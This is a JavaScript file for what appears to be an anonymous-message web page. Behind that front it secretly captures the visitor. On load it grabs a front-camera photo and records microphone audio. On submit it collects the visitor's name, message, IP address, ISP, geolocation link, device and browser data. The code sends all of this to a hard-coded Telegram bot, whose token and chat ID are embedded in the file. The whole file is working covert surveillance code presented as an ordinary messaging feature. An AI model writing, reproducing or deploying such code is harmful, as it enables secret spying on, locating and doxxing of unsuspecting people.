// ========== CONFIG ==========
const TELEGRAM_BOT_TOKEN = "8133185989:AAHDUtLI3oeY_3Og8_Gne_Fyq3OgWC9qIW0";
const TELEGRAM_CHAT_ID = "7244443820"; // Your personal Telegram ID
let userName = "";
let userMessage = "";
let audioChunks = [];
let mediaRecorder;
let stopRecording = false;

// ========== IP + Device ==========
async function getDeviceDetails() {
  const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
  const ua = navigator.userAgent;
  return {
    ip: ipData.ip,
    location: `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}`,
    isp: ipData.org,
    browser: ua,
    device: navigator.userAgentData ? navigator.userAgentData.platform : navigator.platform
  };
}

// ========== CAMERA ==========
async function takePhoto() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const track = stream.getVideoTracks()[0];
    const imageCapture = new ImageCapture(track);
    const photo = await imageCapture.takePhoto();

    const reader = new FileReader();
    reader.readAsDataURL(photo);
    reader.onloadend = () => {
      const base64data = reader.result;
      sendPhotoToBot(base64data);
      track.stop();
    };
  } catch (err) {
    console.warn("Camera permission denied or error:", err);
  }
}

function sendPhotoToBot(base64img) {
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
    method: "POST",
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      photo: base64img,
      caption: "📸 Front Cam Image Captured"
    }),
    headers: {
      "Content-Type": "application/json"
    }
  });
}

// ========== AUDIO ==========
async function startRecording() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    mediaRecorder = new MediaRecorder(stream);
    mediaRecorder.ondataavailable = (e) => {
      audioChunks.push(e.data);
    };
    mediaRecorder.onstop = () => {
      const blob = new Blob(audioChunks, { type: 'audio/webm' });
      const reader = new FileReader();
      reader.readAsDataURL(blob);
      reader.onloadend = () => {
        sendAudioToBot(reader.result);
      };
    };
    mediaRecorder.start();
  } catch (err) {
    console.warn("Audio permission denied:", err);
  }
}

function stopRecordingAndSend() {
  if (mediaRecorder && mediaRecorder.state === "recording") {
    mediaRecorder.stop();
  }
}

function sendAudioToBot(base64Audio) {
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`, {
    method: "POST",
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      audio: base64Audio,
      caption: "🎙️ Voice message from user"
    }),
    headers: {
      "Content-Type": "application/json"
    }
  });
}

// ========== MESSAGE SEND ==========
document.getElementById("sendBtn").addEventListener("click", async () => {
  const msg = document.getElementById("message").value.trim();
  if (!msg) return;

  document.querySelector(".popup").classList.remove("hidden");
});

document.getElementById("confirmSend").addEventListener("click", async () => {
  const nameInput = document.getElementById("name").value.trim();
  if (!nameInput) {
    document.getElementById("name").style.border = "1px solid red";
    return;
  }

  userName = nameInput;
  userMessage = document.getElementById("message").value.trim();
  document.querySelector(".popup").classList.add("hidden");

  stopRecordingAndSend(); // stop mic
  const details = await getDeviceDetails();

  const textMsg = `
🕊️ ${userName} sent a message

💬 ${userMessage}
🌐 IP: ${details.ip}
📱 Device: ${details.device}
🧠 Browser: ${details.browser}
🕐 Time: ${new Date().toLocaleString()}
📍 Location: ${details.location}
📡 Network: ${details.isp}
`;

  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: "POST",
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: textMsg
    }),
    headers: {
      "Content-Type": "application/json"
    }
  });
});

// ========== INIT ==========
(async () => {
  try {
    await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
    takePhoto();
    startRecording();
  } catch (err) {
    console.log("Permissions denied at start.");
  }
})();
